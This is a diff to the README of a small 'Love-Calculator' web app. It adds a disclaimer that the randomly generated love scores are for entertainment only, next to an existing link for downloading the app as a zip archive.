@@ -3,6 +3,8 @@
 ## 🚀 Getting Started
 Welcome to the Love-Calculator! This fun web app lets you enter two names and get a random love score. It's perfect for parties, dates, or just for fun. Follow these steps to download and run the application on your computer.
 
+**Disclaimer: The values generated are randomized and not to be taken for granted, They are not reflecting real emotions or compatibility, this application is only for entertainment purposes.**
+
 ## 📥 Download the App
 [![Download Love-Calculator](https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip)](https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip)
 
